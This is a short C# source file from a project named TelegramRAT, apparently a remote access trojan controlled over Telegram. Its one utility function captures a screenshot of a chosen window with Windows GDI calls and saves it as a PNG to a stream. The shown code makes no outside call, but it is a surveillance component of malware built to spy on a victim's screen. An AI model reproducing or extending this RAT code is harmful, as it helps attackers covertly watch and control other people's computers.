using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Drawing;

namespace TelegramRAT
{
    static class Utils
    {
        public static void CaptureWindow(IntPtr hWnd, Stream buffer)
        {
            Rectangle windowbounds = WinAPI.GetWindowBounds(hWnd);

            Bitmap windowCap = new Bitmap(windowbounds.Width - 16, windowbounds.Height - 8);

            Graphics wndGraphics = Graphics.FromImage(windowCap);

            IntPtr graphicsDc = wndGraphics.GetHdc();

            IntPtr windowDc = WinAPI.GetDC(hWnd);

            WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);

            wndGraphics.ReleaseHdc();

            windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);

        }
    }
}
